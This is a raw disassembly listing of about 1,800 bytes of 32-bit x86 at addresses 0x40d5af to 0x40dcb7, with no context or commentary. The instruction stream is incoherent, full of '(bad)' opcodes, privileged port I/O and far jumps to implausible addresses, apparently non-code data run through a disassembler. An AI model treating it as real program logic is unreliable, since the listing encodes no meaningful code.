  40d5af:	mov    ds:0x6d96688d,al
  40d5b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5b5:	pop    ecx
  40d5b6:	test   eax,0xea24f88b
  40d5bb:	das    
  40d5bc:	sub    al,0x92
  40d5be:	xcrypt-ofb (bad)
  40d5bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5c0:	scas   al,BYTE PTR es:[edi]
  40d5c1:	dec    ebp
  40d5c2:	inc    ebx
  40d5c3:	and    DWORD PTR [esi+eax*1+0x7193e305],edx
  40d5ca:	repz iret 
  40d5cc:	ins    BYTE PTR es:[edi],dx
  40d5cd:	mov    bh,0x46
  40d5cf:	fnstcw WORD PTR [edi]
  40d5d1:	mov    ebx,0xe27e4b02
  40d5d6:	cwde   
  40d5d7:	shl    BYTE PTR [esi-0x36],cl
  40d5da:	cld    
  40d5db:	mov    ecx,0x256248e9
  40d5e0:	imul   ebx,DWORD PTR [ecx+eax*1-0x67192357],0xffffffe9
  40d5e8:	adc    al,0x6a
  40d5ea:	jne    0x40d5f1
  40d5ec:	es jae 0x40d5ff
  40d5ef:	pop    edi
  40d5f0:	mov    ch,0x1f
  40d5f2:	aam    0xc3
  40d5f4:	repnz int3 
  40d5f6:	jb     0x40d66e
  40d5f8:	call   0x6c794d35
  40d5fd:	outs   dx,BYTE PTR ds:[esi]
  40d5fe:	push   eax
  40d5ff:	stos   BYTE PTR es:[edi],al
  40d600:	sub    BYTE PTR [eax+0xc],dl
  40d603:	ins    DWORD PTR es:[edi],dx
  40d604:	and    ecx,DWORD PTR [esp+ebx*2]
  40d607:	(bad)  
  40d608:	pop    ebx
  40d609:	das    
  40d60a:	sub    al,0x95
  40d60c:	(bad)  
  40d60d:	push   ds
  40d60e:	enter  0x8973,0x2d
  40d612:	pop    edi
  40d613:	scas   al,BYTE PTR es:[edi]
  40d614:	xlat   BYTE PTR ds:[ebx]
  40d615:	cmc    
  40d616:	adc    BYTE PTR [ebp+0x2289ee9],0x26
  40d61d:	push   ds
  40d61e:	mov    edi,0xa8b56a55
  40d623:	mov    BYTE PTR [ebx],ah
  40d625:	in     al,dx
  40d626:	aaa    
  40d627:	(bad)  
  40d628:	test   edi,0xda14a4da
  40d62e:	inc    esp
  40d62f:	test   al,0x6c
  40d631:	mov    ah,0x37
  40d633:	mov    al,ds:0x1eda99dd
  40d638:	ja     0x40d5c7
  40d63a:	jne    0x40d60c
  40d63c:	inc    ebp
  40d63d:	push   ss
  40d63e:	jmp    0xee36:0x8648fc96
  40d645:	or     ebx,DWORD PTR [ecx]
  40d647:	push   esp
  40d648:	ins    DWORD PTR es:[edi],dx
  40d649:	mov    esi,0x67db0699
  40d64e:	cmp    edi,esp
  40d650:	add    ebx,DWORD PTR [edi-0x48]
  40d653:	ror    ah,1
  40d655:	or     BYTE PTR [ecx+esi*2-0x5c],cl
  40d659:	hlt    
  40d65a:	cmp    ebx,esi
  40d65c:	out    dx,al
  40d65d:	add    DWORD PTR [edx*1-0x2d1036a6],esi
  40d664:	sub    al,0x12
  40d666:	fstp   TBYTE PTR [ebp-0x1b]
  40d669:	test   al,0xa6
  40d66b:	icebp  
  40d66c:	pop    ds
  40d66d:	xor    al,0xda
  40d66f:	cmp    BYTE PTR [esi],bh
  40d671:	sahf   
  40d672:	push   ss
  40d673:	retf   0xb052
  40d676:	cmp    DWORD PTR [esi+0x1af2735a],ebx
  40d67c:	jp     0x40d6b1
  40d67e:	js     0x40d6d3
  40d680:	pusha  
  40d681:	test   al,0x71
  40d683:	shl    DWORD PTR [edi+0x19],0xd7
  40d687:	push   edi
  40d688:	or     eax,0xf34425fa
  40d68d:	push   esp
  40d68e:	bound  edi,QWORD PTR [eax]
  40d690:	push   edx
  40d691:	push   es
  40d692:	sub    DWORD PTR [ecx-0x6de6d620],ebx
  40d698:	xor    BYTE PTR [ebx],0x8f
  40d69b:	(bad)  
  40d69c:	imul   edi,DWORD PTR [esi],0xffffffc0
  40d69f:	popf   
  40d6a0:	cdq    
  40d6a1:	jno    0x40d703
  40d6a3:	jge    0x40d6fb
  40d6a5:	dec    ecx
  40d6a6:	adc    al,0x96
  40d6a8:	jae    0x40d70b
  40d6aa:	cdq    
  40d6ab:	pop    ds
  40d6ac:	into   
  40d6ad:	(bad)  [edi-0x308e9fed]
  40d6b3:	in     eax,0x7b
  40d6b5:	stos   DWORD PTR es:[edi],eax
  40d6b6:	stos   BYTE PTR es:[edi],al
  40d6b7:	mov    ebp,ecx
  40d6b9:	ds jns 0x40d6bc
  40d6bc:	les    ecx,FWORD PTR [ebx+0x7d]
  40d6bf:	xor    edi,ebp
  40d6c1:	mov    edi,0xb93dfcee
  40d6c6:	daa    
  40d6c7:	push   ds
  40d6c8:	aam    0x40
  40d6ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6cb:	xor    eax,DWORD PTR [ebp+0x7]
  40d6ce:	add    dl,bh
  40d6d0:	stos   BYTE PTR es:[edi],al
  40d6d1:	js     0x40d653
  40d6d3:	push   ss
  40d6d4:	add    cl,ch
  40d6d6:	or     al,0xcf
  40d6d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6d9:	jmp    0xd266:0x3ab60eed
  40d6e0:	iret   
  40d6e1:	adc    bh,BYTE PTR [eax+ebx*4]
  40d6e4:	out    dx,al
  40d6e5:	sti    
  40d6e6:	mov    DWORD PTR ds:0x5bc72b06,ebx
  40d6ec:	and    esi,DWORD PTR [ecx-0x44]
  40d6ef:	ins    DWORD PTR es:[edi],dx
  40d6f0:	scas   al,BYTE PTR es:[edi]
  40d6f1:	xchg   edi,eax
  40d6f2:	jecxz  0x40d6ad
  40d6f4:	inc    esp
  40d6f5:	pop    ebp
  40d6f6:	rcl    DWORD PTR [ebp+0xca231d4],0xc1
  40d6fd:	(bad)  
  40d6fe:	sub    dl,BYTE PTR [ebx+0xe]
  40d701:	daa    
  40d702:	add    edx,DWORD PTR [edi]
  40d704:	inc    edi
  40d705:	add    DWORD PTR [esi+eax*2-0x709223ed],ebx
  40d70c:	pop    ebx
  40d70d:	(bad)
  40d710:	push   ds
  40d711:	inc    eax
  40d712:	sbb    esp,DWORD PTR [edx]
  40d714:	sahf   
  40d715:	or     esi,DWORD PTR [edi+0x24]
  40d718:	inc    esp
  40d719:	iret   
  40d71a:	adc    DWORD PTR [edx-0x66a81df4],ebp
  40d720:	pop    ss
  40d721:	or     eax,0x4df8bf3c
  40d726:	loop   0x40d7a6
  40d728:	push   0x63
  40d72a:	pop    ds
  40d72b:	or     ebp,esp
  40d72d:	(bad)  
  40d72e:	dec    ebx
  40d72f:	jge    0x40d794
  40d731:	mov    DWORD PTR [edi+0x4f8c15e5],ecx
  40d737:	pop    ds
  40d738:	pop    ss
  40d739:	shr    DWORD PTR [edi-0x7e],1
  40d73c:	sub    BYTE PTR [ebx+0x1f],al
  40d73f:	jae    0x40d7b6
  40d741:	std    
  40d742:	inc    edi
  40d743:	xchg   esp,eax
  40d744:	sub    eax,0x2fe50a06
  40d749:	dec    edi
  40d74a:	jl     0x40d76a
  40d74c:	ins    DWORD PTR es:[edi],dx
  40d74d:	enter  0xe66f,0xfb
  40d751:	cmp    BYTE PTR ds:0xb142d078,ch
  40d757:	arpl   WORD PTR [ebx],di
  40d759:	inc    edi
  40d75a:	xchg   edx,eax
  40d75b:	clc    
  40d75c:	or     BYTE PTR ds:0x113cb26d,cl
  40d762:	into   
  40d763:	push   cs
  40d764:	add    DWORD PTR [edx+0x12],0x72d23644
  40d76b:	mov    bh,0x2
  40d76d:	or     eax,0xf703d814
  40d772:	jmp    0xdaed88b
  40d777:	fadd   DWORD PTR [edx+0x5b]
  40d77a:	jb     0x40d742
  40d77c:	test   DWORD PTR [edx+ecx*8+0x71],ecx
  40d780:	aam    0x82
  40d782:	dec    ebp
  40d783:	in     eax,dx
  40d784:	icebp  
  40d785:	mov    ebp,0x4a31a3fb
  40d78a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d78b:	mov    ds:0x97f5b14b,eax
  40d790:	and    esp,edx
  40d792:	mov    ebp,DWORD PTR [edi]
  40d794:	jmp    0x40d733
  40d796:	outs   dx,BYTE PTR ds:[esi]
  40d797:	daa    
  40d798:	aam    0x7e
  40d79a:	mov    ebp,0xdcfae322
  40d79f:	sbb    BYTE PTR ds:0x45c49085,ah
  40d7a5:	xchg   BYTE PTR [edx+0x3d6de3fa],cl
  40d7ab:	push   ds
  40d7ac:	push   0xfffffff9
  40d7ae:	and    ecx,DWORD PTR [edx-0x3da25b2d]
  40d7b4:	pop    edi
  40d7b5:	dec    ecx
  40d7b6:	lea    edi,[edi-0x3b]
  40d7b9:	pop    eax
  40d7ba:	inc    esi
  40d7bb:	mov    ds:0xf7f2253e,al
  40d7c0:	mov    edi,0x89e20c31
  40d7c5:	xchg   ecx,eax
  40d7c6:	std    
  40d7c7:	mov    ds:0xa3a4fcb8,eax
  40d7cc:	xchg   ebx,eax
  40d7cd:	dec    ebx
  40d7ce:	outs   dx,BYTE PTR ds:[esi]
  40d7cf:	mov    al,ds:0x732448ed
  40d7d4:	jg     0x40d826
  40d7d6:	mov    eax,0xc22d30c9
  40d7db:	pop    ss
  40d7dc:	sbb    BYTE PTR [ebx+0x5b2c673f],ch
  40d7e2:	mov    cl,0x6f
  40d7e4:	lock and eax,0xd0449372
  40d7ea:	in     eax,dx
  40d7eb:	aam    0xe6
  40d7ed:	in     eax,dx
  40d7ee:	scas   al,BYTE PTR es:[di]
  40d7f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7f1:	aas    
  40d7f2:	ror    DWORD PTR [ecx-0x3c],0x37
  40d7f6:	and    al,0x15
  40d7f8:	jb     0x40d858
  40d7fa:	mov    cl,0xf1
  40d7fc:	jg     0x40d830
  40d7fe:	stc    
  40d7ff:	mov    esp,0xd239d8da
  40d804:	fdivr  QWORD PTR [esi]
  40d806:	ret    0x3e00
  40d809:	out    0x22,eax
  40d80b:	popa   
  40d80c:	popf   
  40d80d:	dec    eax
  40d80e:	adc    al,0xf8
  40d810:	inc    esp
  40d811:	inc    edx
  40d812:	out    0x76,eax
  40d814:	or     eax,DWORD PTR [esi-0x2dc85091]
  40d81a:	dec    edx
  40d81b:	xchg   ecx,eax
  40d81c:	jne    0x40d829
  40d81e:	or     DWORD PTR [esi-0x29e12e63],edi
  40d824:	adc    al,0xd6
  40d826:	mov    edx,0xf7f7449a
  40d82b:	jge    0x40d7fb
  40d82d:	sub    bh,BYTE PTR [ebx-0x6]
  40d830:	xchg   ebp,eax
  40d831:	arpl   WORD PTR [eax-0x57],ax
  40d834:	arpl   WORD PTR [edx+eax*4],dx
  40d837:	bound  edx,QWORD PTR [ecx+ecx*8+0x2b]
  40d83b:	push   ebp
  40d83c:	(bad)  
  40d83d:	das    
  40d83e:	mov    edx,0x3eb88fad
  40d843:	jno    0x40d896
  40d845:	mov    esp,0xa054992c
  40d84a:	pop    edi
  40d84b:	stos   BYTE PTR es:[edi],al
  40d84c:	aaa    
  40d84d:	push   ebp
  40d84e:	mov    al,0x8c
  40d850:	fbld   TBYTE PTR [esi+0x1d43fe53]
  40d856:	xor    al,0x40
  40d858:	pop    es
  40d859:	xor    eax,0xbd56424
  40d85e:	ds cmp edx,0x3a6be00
  40d865:	lds    ecx,FWORD PTR [ebx+0x372b797e]
  40d86b:	into   
  40d86c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d86d:	ins    BYTE PTR es:[edi],dx
  40d86e:	loope  0x40d843
  40d870:	ror    BYTE PTR [esi],1
  40d872:	addr16 push edi
  40d874:	xchg   DWORD PTR [edi],eax
  40d876:	sbb    eax,eax
  40d878:	retf   
  40d879:	ja     0x40d8c4
  40d87b:	jbe    0x40d898
  40d87d:	add    eax,0xd4a126ba
  40d882:	arpl   WORD PTR [esp+ebp*1-0x2c],di
  40d886:	and    DWORD PTR [ecx],ebp
  40d888:	sahf   
  40d889:	nop
  40d88a:	out    0x79,eax
  40d88c:	mov    ebx,0x233c2ed1
  40d891:	sahf   
  40d892:	mov    eax,0x4e97111
  40d897:	mov    bl,0xc8
  40d899:	jae    0x40d833
  40d89b:	inc    edx
  40d89c:	jmp    0x54e3:0xddd1dac2
  40d8a3:	stc    
  40d8a4:	gs xchg ebp,eax
  40d8a6:	adc    bh,BYTE PTR [edi]
  40d8a8:	outs   dx,DWORD PTR ds:[esi]
  40d8a9:	(bad)  [edx-0xbb2b118]
  40d8af:	dec    BYTE PTR [ebx+ebx*4]
  40d8b2:	rcr    esp,1
  40d8b4:	repnz xor esi,ebp
  40d8b7:	mov    cl,0x22
  40d8b9:	fs loope 0x40d928
  40d8bc:	outs   dx,DWORD PTR ds:[esi]
  40d8bd:	push   ecx
  40d8be:	sbb    edi,ebp
  40d8c0:	xor    BYTE PTR [edi+0x7e0ea1a5],bh
  40d8c6:	cdq    
  40d8c7:	hlt    
  40d8c8:	mov    ds:0x5c7f792b,eax
  40d8cd:	mov    eax,0xd2d55b48
  40d8d2:	icebp  
  40d8d3:	pop    ebx
  40d8d4:	loope  0x40d86c
  40d8d6:	ret    
  40d8d7:	pop    ecx
  40d8d8:	addr16 mov ebp,0x915b85ff
  40d8de:	add    eax,0xb1ad3235
  40d8e3:	cmp    BYTE PTR [ebp+0x41],dh
  40d8e6:	push   esp
  40d8e7:	adc    eax,0xbf3d9503
  40d8ec:	cli    
  40d8ed:	xlat   BYTE PTR ds:[ebx]
  40d8ee:	dec    ebx
  40d8ef:	adc    bl,BYTE PTR [edi]
  40d8f1:	push   0x20
  40d8f3:	ror    DWORD PTR ds:0x4c48a85d,0x3d
  40d8fa:	outs   dx,DWORD PTR ds:[esi]
  40d8fb:	inc    BYTE PTR [esi+0x25]
  40d8fe:	cmc    
  40d8ff:	outs   dx,BYTE PTR ds:[esi]
  40d900:	push   ebp
  40d901:	sub    BYTE PTR [esi+ebx*2],0x24
  40d905:	mov    BYTE PTR [esp-0x2f],cl
  40d909:	jb     0x40d978
  40d90b:	xchg   edx,eax
  40d90c:	dec    esp
  40d90d:	jge    0x40d8dc
  40d90f:	push   esi
  40d910:	pop    ss
  40d911:	jno    0x40d8b8
  40d913:	call   0x51a263f9
  40d918:	and    DWORD PTR [ebx],0x16f46b6e
  40d91e:	aad    0x9e
  40d920:	daa    
  40d921:	add    eax,0x48303c72
  40d926:	push   cs
  40d927:	mov    bh,0x24
  40d929:	adc    al,BYTE PTR [eax+0x5b]
  40d92c:	mov    WORD PTR [edx-0x53],es
  40d92f:	test   eax,0xea467c20
  40d934:	cld    
  40d935:	push   edx
  40d936:	mov    ds,WORD PTR [esi]
  40d938:	cwde   
  40d939:	mov    esp,0x81cbf097
  40d93e:	sbb    BYTE PTR [esi],0x24
  40d941:	cmp    esi,DWORD PTR [eax]
  40d943:	and    BYTE PTR [ecx-0x4cc93b99],bh
  40d949:	iret   
  40d94a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d94b:	ins    DWORD PTR es:[edi],dx
  40d94c:	in     eax,dx
  40d94d:	add    bl,BYTE PTR [ebx-0x5809247]
  40d953:	and    esi,eax
  40d955:	xlat   BYTE PTR ds:[ebx]
  40d956:	pop    esp
  40d957:	cwde   
  40d958:	jg     0x40d9d0
  40d95a:	jg     0x40d906
  40d95c:	rcr    BYTE PTR [edi+eax*2-0x61],1
  40d960:	test   DWORD PTR [ecx-0x20],ebx
  40d963:	inc    ebp
  40d964:	jae    0x40d99b
  40d966:	ins    BYTE PTR es:[edi],dx
  40d967:	je     0x40d971
  40d969:	sub    BYTE PTR [ebx],0x1e
  40d96c:	sbb    DWORD PTR [edi+0x2ddee65c],0x7c
  40d973:	jmp    0x40d97e
  40d975:	jmp    0x8596:0xd9f0358a
  40d97c:	ror    DWORD PTR [eax+0x27],0x51
  40d980:	sbb    DWORD PTR [edi],ecx
  40d982:	or     DWORD PTR [eax],ebx
  40d984:	cwde   
  40d985:	lea    eax,[ebp-0x705ea792]
  40d98b:	addr16 jno 0x40d9d9
  40d98e:	sub    ch,BYTE PTR [ebx+0xb]
  40d991:	dec    ebx
  40d992:	stos   DWORD PTR es:[edi],eax
  40d993:	pop    edi
  40d994:	loopne 0x40d9fa
  40d996:	dec    ebx
  40d997:	pushf  
  40d998:	mov    ebx,0xa870f553
  40d99d:	adc    DWORD PTR [eax-0x35f1bb6c],esp
  40d9a3:	inc    edi
  40d9a4:	test   ebx,edx
  40d9a6:	adc    bh,ah
  40d9a8:	inc    esp
  40d9a9:	mov    esp,0x2887aa2b
  40d9ae:	dec    esp
  40d9af:	sbb    eax,0x6d1bda3c
  40d9b4:	fs aad 0x63
  40d9b7:	push   esp
  40d9b8:	sti    
  40d9b9:	fstp   QWORD PTR [esi+0x0]
  40d9bc:	pop    ss
  40d9bd:	dec    ebx
  40d9be:	in     al,0x2a
  40d9c0:	push   0x359486a7
  40d9c5:	scas   eax,DWORD PTR es:[edi]
  40d9c6:	and    edx,DWORD PTR [edx-0x25]
  40d9c9:	fbld   TBYTE PTR [esi]
  40d9cb:	sbb    eax,DWORD PTR [eax]
  40d9cd:	push   ebx
  40d9ce:	popa   
  40d9cf:	jle    0x40d9fc
  40d9d1:	sbb    esi,edx
  40d9d3:	loopne 0x40d9cc
  40d9d5:	mov    eax,ds:0x761ecc5b
  40d9da:	xor    esi,esi
  40d9dc:	mov    BYTE PTR [edx-0x260aee38],cl
  40d9e2:	jbe    0x40d9e6
  40d9e4:	mov    ebp,DWORD PTR [ebx+edi*2+0x3b]
  40d9e8:	dec    esi
  40d9e9:	mov    dh,0xd
  40d9eb:	sub    al,0x77
  40d9ed:	sti    
  40d9ee:	push   ss
  40d9ef:	call   0x9b09:0x1c39ca48
  40d9f6:	inc    edx
  40d9f7:	or     al,0xea
  40d9f9:	cmc    
  40d9fa:	xor    BYTE PTR [ecx-0x59],ch
  40d9fd:	push   ss
  40d9fe:	or     dh,BYTE PTR [ecx]
  40da00:	(bad)  
  40da01:	fsubr  QWORD PTR [esi+esi*1+0x52]
  40da05:	or     ch,al
  40da07:	xor    al,0xae
  40da09:	enterw 0xfc81,0x50
  40da0e:	sub    DWORD PTR [esi],ebp
  40da10:	fisttp QWORD PTR [eax]
  40da12:	ss and eax,0x8c5f5703
  40da18:	ror    DWORD PTR [edi],1
  40da1a:	push   cs
  40da1b:	inc    ebx
  40da1c:	sub    bh,BYTE PTR [ebp-0x32]
  40da1f:	dec    ecx
  40da20:	jns    0x40da7a
  40da22:	popa   
  40da23:	ins    DWORD PTR es:[edi],dx
  40da24:	add    esp,0x40
  40da27:	xchg   edi,eax
  40da28:	cmp    dh,dl
  40da2a:	mov    bl,0x33
  40da2c:	xchg   ecx,eax
  40da2d:	stos   BYTE PTR es:[edi],al
  40da2e:	mov    ch,0x8
  40da30:	sahf   
  40da31:	xlat   BYTE PTR ds:[ebx]
  40da32:	dec    eax
  40da33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da35:	xor    BYTE PTR [ebp-0x63560afe],ah
  40da3b:	pop    ecx
  40da3c:	dec    ebx
  40da3d:	add    al,0xbd
  40da3f:	repnz xor al,0xa8
  40da42:	fwait
  40da43:	and    al,0xc
  40da45:	retf   
  40da46:	mov    bl,0xb4
  40da48:	cmp    cl,BYTE PTR [ecx+0x77]
  40da4b:	or     BYTE PTR [bx+di],ch
  40da4e:	out    0xf8,eax
  40da50:	sub    ebx,DWORD PTR [esi]
  40da52:	aaa    
  40da53:	test   DWORD PTR [ecx+0x34],ebp
  40da56:	popf   
  40da57:	in     eax,0x73
  40da59:	and    esp,DWORD PTR [ecx-0x29a59ea7]
  40da5f:	or     ebx,ebp
  40da61:	xchg   edi,eax
  40da62:	(bad)  
  40da63:	(bad)  
  40da64:	sbb    BYTE PTR [edi],0xb1
  40da67:	or     BYTE PTR [ebp+0x47d85cdf],0xa
  40da6e:	push   es
  40da6f:	les    ecx,FWORD PTR [ebp+edi*8+0x51a071de]
  40da76:	ja     0x40dada
  40da78:	push   ss
  40da79:	sar    ebx,0x3d
  40da7c:	int3   
  40da7d:	xchg   ebp,eax
  40da7e:	mov    ah,0x82
  40da80:	cs inc esi
  40da82:	or     eax,0xac9f4287
  40da87:	or     al,0x8b
  40da89:	or     bl,BYTE PTR [ebp+0x35]
  40da8c:	cmp    al,0x46
  40da8e:	stos   DWORD PTR es:[edi],eax
  40da8f:	push   es
  40da90:	or     eax,0xdf59390e
  40da95:	and    ah,ch
  40da97:	rcl    BYTE PTR [esi+0x41c6acc7],1
  40da9d:	add    al,0xcc
  40da9f:	mov    DWORD PTR [edi],esp
  40daa1:	mov    ah,BYTE PTR [edx+0x739760c5]
  40daa7:	jo     0x40da99
  40daa9:	mov    ebx,0x969aa3f5
  40daae:	push   cs
  40daaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dab0:	(bad)  
  40dab1:	sbb    al,0x35
  40dab3:	inc    ecx
  40dab4:	outs   dx,BYTE PTR ds:[esi]
  40dab5:	dec    eax
  40dab6:	inc    esi
  40dab7:	push   edi
  40dab8:	adc    bh,BYTE PTR [edx-0x3b0d3ce3]
  40dabe:	jmp    0x9de8:0x7947e42b
  40dac5:	push   0xcff56c44
  40daca:	sub    cl,BYTE PTR [edx-0x5f86ecb8]
  40dad0:	fwait
  40dad1:	nop
  40dad2:	leave  
  40dad3:	les    ecx,FWORD PTR [ebx]
  40dad5:	popa   
  40dad6:	and    eax,0xad1f662f
  40dadb:	and    DWORD PTR [edi-0x11],ebp
  40dade:	sub    DWORD PTR [ebx+0x236810a3],edx
  40dae4:	jns    0x40da74
  40dae6:	pop    edx
  40dae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dae8:	mov    esi,DWORD PTR [ebp-0x64]
  40daeb:	xchg   esp,eax
  40daec:	sub    eax,0x202a536c
  40daf1:	nop
  40daf2:	call   0x85e4931c
  40daf7:	mov    esi,0xa85a3a5d
  40dafc:	fnstcw WORD PTR [edx+0x35c22225]
  40db02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db03:	fidiv  DWORD PTR [ebp+ecx*8+0x2a32eab3]
  40db0a:	jg     0x40db5b
  40db0c:	and    DWORD PTR [eax+0x76],edi
  40db0f:	push   eax
  40db10:	push   edi
  40db11:	mov    ebx,0x3772adc0
  40db16:	fld    QWORD PTR [ebp-0x53]
  40db19:	sbb    al,0x34
  40db1b:	retf   0xf13d
  40db1e:	(bad)  
  40db1f:	mov    ds:0x1ae33cf5,al
  40db24:	shr    bl,1
  40db26:	ficom  WORD PTR [edi]
  40db28:	and    ebx,DWORD PTR [edi]
  40db2a:	pop    esi
  40db2b:	jmp    0x40dabf
  40db2d:	ja     0x40db2a
  40db2f:	mov    esi,0xd43ea0e4
  40db34:	ins    DWORD PTR es:[edi],dx
  40db35:	add    BYTE PTR [edx],al
  40db37:	sbb    DWORD PTR [eax+0x2f],ebp
  40db3a:	lods   al,BYTE PTR ds:[esi]
  40db3b:	seta   BYTE PTR [esi+0x25138e60]
  40db42:	xchg   ebx,eax
  40db43:	pushf  
  40db44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db45:	push   cs
  40db46:	(bad)  
  40db47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db48:	jbe    0x40db43
  40db4a:	rol    BYTE PTR [ebx],0x20
  40db4d:	stc    
  40db4e:	shl    ecx,1
  40db50:	jb     0x40db5c
  40db52:	cld    
  40db53:	jmp    0x21771c3
  40db58:	jnp    0x40db7b
  40db5a:	xlat   BYTE PTR ds:[ebx]
  40db5b:	push   es
  40db5c:	ror    DWORD PTR [edx],cl
  40db5e:	inc    ebp
  40db5f:	mov    eax,0x1b1148df
  40db64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db65:	sbb    ah,BYTE PTR [ecx]
  40db67:	call   0x6971dfa
  40db6c:	xor    bl,BYTE PTR [ebx]
  40db6e:	(bad)  
  40db6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db70:	pop    esp
  40db71:	adc    cl,ch
  40db73:	outs   dx,DWORD PTR ds:[esi]
  40db74:	mov    edx,edx
  40db76:	mov    DWORD PTR [eax],esp
  40db78:	es pop ecx
  40db7a:	xor    ebx,DWORD PTR [eax+0x6c6c2d86]
  40db80:	daa    
  40db81:	mov    cl,0xae
  40db83:	out    dx,eax
  40db84:	(bad)  
  40db86:	ds inc eax
  40db88:	shr    esp,1
  40db8a:	mov    WORD PTR [ebx+0x38d75064],ds
  40db90:	mov    BYTE PTR [esi-0x24],ch
  40db93:	push   ebp
  40db94:	aaa    
  40db95:	mov    ebp,0xdcada2da
  40db9a:	mov    al,ds:0xfd1a8bb8
  40db9f:	leave  
  40dba0:	and    al,0xa5
  40dba2:	pop    ebp
  40dba3:	jg     0x40dbb8
  40dba5:	sbb    DWORD PTR [esi+0x4efa31e4],esi
  40dbab:	repz inc ebx
  40dbad:	dec    edi
  40dbae:	scas   al,BYTE PTR es:[edi]
  40dbaf:	fwait
  40dbb0:	rcl    BYTE PTR [ebx-0x2e],1
  40dbb3:	sti    
  40dbb4:	mov    bl,0x73
  40dbb6:	dec    eax
  40dbb7:	test   ebp,ecx
  40dbb9:	cld    
  40dbba:	or     BYTE PTR [edx-0x6c8f7757],bh
  40dbc0:	pushf  
  40dbc1:	add    BYTE PTR [esi+0x45],ch
  40dbc4:	nop
  40dbc5:	scas   eax,DWORD PTR es:[edi]
  40dbc6:	sub    DWORD PTR [eax],ebx
  40dbc8:	retf   0xcbf4
  40dbcb:	push   es
  40dbcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbcd:	mov    ah,0x53
  40dbcf:	pop    edx
  40dbd0:	dec    esi
  40dbd1:	adc    BYTE PTR ds:0xf332678a,dh
  40dbd7:	inc    eax
  40dbd8:	dec    ebp
  40dbd9:	mov    ds,WORD PTR [edx-0x36]
  40dbdc:	jg     0x40dbad
  40dbde:	ins    BYTE PTR es:[edi],dx
  40dbdf:	dec    ecx
  40dbe0:	psadbw mm6,QWORD PTR [eax-0x1c3fcfe5]
  40dbe7:	jecxz  0x40dbb8
  40dbe9:	pop    ds
  40dbea:	add    eax,0x44758272
  40dbef:	pop    esp
  40dbf0:	test   eax,0xf2f20b15
  40dbf5:	mov    bl,0xde
  40dbf7:	mov    eax,0x13c5576a
  40dbfc:	xor    DWORD PTR gs:[eax+0x7d],eax
  40dc00:	inc    ebx
  40dc01:	ret    
  40dc02:	in     eax,0x50
  40dc04:	lods   eax,DWORD PTR ds:[esi]
  40dc05:	(bad)  
  40dc06:	rcr    BYTE PTR [edx+0x7d],cl
  40dc09:	mov    cl,0x9a
  40dc0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc0c:	fcom   DWORD PTR [ecx-0x40]
  40dc0f:	outs   dx,BYTE PTR ds:[esi]
  40dc10:	(bad)  
  40dc11:	es ds dec esp
  40dc14:	(bad)  
  40dc15:	int3   
  40dc16:	(bad)  
  40dc17:	jle    0x40dc04
  40dc19:	ret    0x1ff6
  40dc1c:	jns    0x40dbba
  40dc1e:	jg     0x40dbfa
  40dc20:	jl     0x40dbf0
  40dc22:	cdq    
  40dc23:	mov    edi,DWORD PTR [edi]
  40dc25:	je     0x40dc2e
  40dc27:	jg     0x40dc88
  40dc29:	enter  0x13bc,0x52
  40dc2d:	adc    ah,BYTE PTR [ebx+0x31f6eb3d]
  40dc33:	inc    esi
  40dc34:	sbb    BYTE PTR [edx],al
  40dc36:	jmp    0x9290b4a3
  40dc3b:	ds push esp
  40dc3d:	and    ah,ah
  40dc3f:	mov    edx,0xbeaee67
  40dc44:	sbb    DWORD PTR [edi],edi
  40dc46:	xor    ch,ah
  40dc48:	fld    st(0)
  40dc4a:	pop    ebp
  40dc4b:	cmp    ecx,DWORD PTR [edx-0x1b]
  40dc4e:	add    ebp,DWORD PTR [esi+ebp*8]
  40dc51:	ret    
  40dc52:	xor    DWORD PTR [ebx],esp
  40dc54:	xor    eax,0x1b412097
  40dc59:	xchg   ebp,eax
  40dc5a:	sub    DWORD PTR [ebx],0xffffffbf
  40dc5d:	in     eax,dx
  40dc5e:	add    edx,DWORD PTR [esi+esi*1]
  40dc61:	pop    edx
  40dc62:	ret    
  40dc63:	dec    edi
  40dc64:	fxch   st(5)
  40dc66:	or     eax,0xb99d4593
  40dc6b:	clc    
  40dc6c:	sbb    eax,DWORD PTR [edi+0x59]
  40dc6f:	and    edi,DWORD PTR [ecx-0xb]
  40dc72:	push   0xffffffb4
  40dc74:	sar    BYTE PTR [ecx+ebp*4],0x2c
  40dc78:	daa    
  40dc79:	sub    DWORD PTR [esp+eiz*8],eax
  40dc7c:	test   eax,0x7e8b6d89
  40dc81:	nop
  40dc82:	xor    eax,0x86f07b46
  40dc87:	adc    dh,BYTE PTR [ecx]
  40dc89:	xchg   ebp,eax
  40dc8a:	loope  0x40dc75
  40dc8c:	out    dx,al
  40dc8d:	cli    
  40dc8e:	push   0x49
  40dc90:	mov    BYTE PTR [esi+0x5d],0x8d
  40dc94:	cmp    DWORD PTR [ebx+ebp*2+0x2b],edi
  40dc98:	push   eax
  40dc99:	mov    WORD PTR [esp+ecx*2+0x5b],?
  40dc9d:	mov    DWORD PTR ds:0xa378c556,esi
  40dca3:	imul   esi,edx,0xffffff98
  40dca6:	mov    gs,WORD PTR [edi+ecx*2+0x2bf5fad5]
  40dcad:	adc    esi,DWORD PTR ds:0x252f023c
  40dcb3:	in     eax,0x41
  40dcb5:	in     eax,0xc
  40dcb7:	dec    ebx
